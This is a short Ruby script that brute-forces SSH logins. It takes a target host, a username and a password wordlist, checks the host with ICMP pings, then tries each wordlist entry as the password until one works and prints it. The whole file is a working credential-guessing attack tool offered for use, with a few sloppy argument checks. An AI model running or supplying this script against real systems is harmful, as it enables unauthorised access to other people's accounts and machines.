require 'rubygems'
require 'net/ping'
require 'net/ssh'

host     = ARGV[0] || ''.empty?
user     = ARGV[1] || ''.empty?
wordlist = ARGV[2] || ''.empty
if ARGV.nil?
    puts "[*] Need a host\n\n\n"
    exit!
end
if ARGV[1].nil?
    puts "[*] Need a username\n\n\n"
    exit!
end
if ARGV[2].nil?
    puts "[-] I need a wordlist\n\n"
    exit!
end

def main(host, user, wordlist)
    system("clear")
    icmp = Net::Ping::ICMP.new(host)
    net = 5.times.count do
        icmp.ping
    end

    unless net >= 3
        puts "[-] Con-Low : Aborting...\n\t"
        abort "[-] Connectivity seems low \n\t"
    end
    File.foreach("#{wordlist}").with_index do |line, idx|
        pass = line.chomp
        puts "\033[31m[*] Attackiong Host -> #{host}"
        puts "\033[31m[*] On username     -> #{user}"
        puts "\033[31m[*] With wordlist   -> #{wordlist}"
        print "[*] Trying Password #{pass} on line -> #{idx}\n"
        begin
            result1 = Net::SSH.start(host,
                                    user,
                                    :password => pass,
                                    :auth_methods => ["password"],
                                    :number_of_password_prompts => 0 
                                    )
        rescue Net::SSH::AuthenticationFailed => auth
        else
            abort "Password found #{pass}"
        end
    end
end

main(host, user, wordlist)
